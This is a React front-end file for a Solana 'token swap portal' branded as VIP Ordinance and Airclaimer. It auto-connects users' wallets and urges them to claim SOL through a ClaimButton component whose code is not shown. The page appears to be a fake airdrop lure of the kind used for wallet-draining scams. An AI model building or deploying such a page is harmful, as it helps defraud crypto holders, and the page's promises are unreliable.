import React, { useMemo } from 'react';
import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import { 
  PhantomWalletAdapter, 
  SolflareWalletAdapter, 
  TorusWalletAdapter,
  Coin98WalletAdapter,
  CoinbaseWalletAdapter
} from '@solana/wallet-adapter-wallets';
import { WalletModalProvider } from '@solana/wallet-adapter-react-ui';
import { clusterApiUrl } from '@solana/web3.js';
import { Wallet, Clock, AlertCircle, CheckCircle, ExternalLink } from 'lucide-react';
import ClaimButton from './components/ClaimButton';
import './App.css';

// Import wallet adapter CSS
import '@solana/wallet-adapter-react-ui/styles.css';

function App() {
  // Set network (Mainnet)
  const network = WalletAdapterNetwork.Mainnet;

  // Get cluster endpoint
  const endpoint = useMemo(() => clusterApiUrl(network), [network]);

  // Configure multiple wallet adapters
  const wallets = useMemo(() => [
    new PhantomWalletAdapter(),
    new SolflareWalletAdapter(),
    new TorusWalletAdapter(),
    new Coin98WalletAdapter(),
    new CoinbaseWalletAdapter()
  ], [network]);

  return (
    <ConnectionProvider endpoint={endpoint}>
      <WalletProvider 
        wallets={wallets} 
        autoConnect={true}
        onError={(error) => {
          console.error('Wallet connection error:', error);
        }}
      >
        <WalletModalProvider featuredWallets={99}>
          <div className="min-h-screen bg-gradient-to-b from-purple-900 via-purple-800 to-purple-900 text-white">
            {/* Floating Elements */}
            <div className="absolute inset-0 overflow-hidden pointer-events-none">
              <div className="absolute top-20 left-10 w-16 h-16 rounded-full bg-teal-400 opacity-20 blur-xl"></div>
              <div className="absolute top-40 right-20 w-32 h-32 rounded-full bg-purple-400 opacity-20 blur-xl"></div>
              <div className="absolute bottom-40 left-1/4 w-24 h-24 rounded-full bg-teal-500 opacity-10 blur-xl"></div>
              <div className="absolute bottom-20 right-1/4 w-20 h-20 rounded-full bg-purple-300 opacity-20 blur-xl"></div>
            </div>

            {/* Navigation */}
            <nav className="relative z-10 px-6 py-5 flex justify-between items-center">
              <div className="flex items-center space-x-2">
                <img 
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAlKL12Wxd7CR1HQdsnkblk60AFlZp9uSGHM4HuQKFhoA6JtBfko3ucsnjPHN9C5Uzqeg&usqp=CAU" 
                  alt="Solana Logo" 
                  className="w-8 h-8"
                />
                <span className="font-bold text-xl">VIP Ordinance</span>
              </div>
            </nav>

            {/* Hero Section */}
            <main className="relative z-10 max-w-6xl mx-auto px-6 pt-12 pb-24">
              <div className="text-center mb-12">
                <h1 className="text-5xl font-bold mb-4 bg-gradient-to-r from-teal-400 to-purple-400 inline-block text-transparent bg-clip-text">
                Swap Your 4-Way Mirror Money to SOL Solana
                </h1>
                <p className="text-xl text-gray-300 max-w-2xl mx-auto">
                  Fast, secure, and simple way to claim your Solana tokens with minimal fees.
                </p>
              </div>

              {/* Claim Card */}
              <div className="max-w-md mx-auto rounded-2xl backdrop-blur-lg bg-white/10 shadow-xl overflow-hidden">
                {/* Card Header */}
                <div className="bg-purple-800/50 px-6 py-4 border-b border-purple-700/50">
                  <h2 className="text-xl font-semibold">Token Swap Portal</h2>
                </div>

                {/* Card Content */}
                <div className="px-6 py-6">
                  <ClaimButton />
                </div>
              </div>

              {/* How It Works */}
              <div className="mt-24">
                <h2 className="text-2xl font-bold text-center mb-12">How It Works</h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                  <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
                    <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                      <Wallet size={20} className="text-teal-400" />
                    </div>
                    <h3 className="text-lg font-semibold mb-2">Connect Wallet</h3>
                    <p className="text-gray-400">Link your Solana wallet to verify your eligibility.</p>
                  </div>
                  
                  <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
                    <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                      <CheckCircle size={20} className="text-teal-400" />
                    </div>
                    <h3 className="text-lg font-semibold mb-2">Verify Eligibility</h3>
                    <p className="text-gray-400">System automatically checks your claim status.</p>
                  </div>
                  
                  <div className="bg-white/5 backdrop-blur-sm rounded-xl p-6 text-center hover:bg-white/10 transition-all">
                    <div className="w-12 h-12 bg-purple-700/50 rounded-full flex items-center justify-center mx-auto mb-4">
                      <div className="bg-teal-400 w-5 h-5 rounded-full"></div>
                    </div>
                    <h3 className="text-lg font-semibold mb-2">Receive SOL</h3>
                    <p className="text-gray-400">Your tokens are processed in queue and sent to your wallet.</p>
                  </div>
                </div>
              </div>
            </main>

            {/* Footer */}
            <footer className="relative z-10 border-t border-purple-800/50 mt-12">
              <div className="max-w-6xl mx-auto px-6 py-8">
                <div className="flex flex-col md:flex-row justify-between items-center">
                  <div className="flex items-center space-x-2 mb-4 md:mb-0">
                    <img 
                      src="https://cryptologos.cc/logos/solana-sol-logo.png?v=040" 
                      alt="Solana Logo" 
                      className="w-6 h-6"
                    />
                    <span className="font-bold">Airclaimer</span>
                  </div>
                  <div className="text-sm text-gray-400">
                    © 2024 Airclaimer. All rights reserved.
                  </div>
                </div>
              </div>
            </footer>
          </div>
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}

export default App;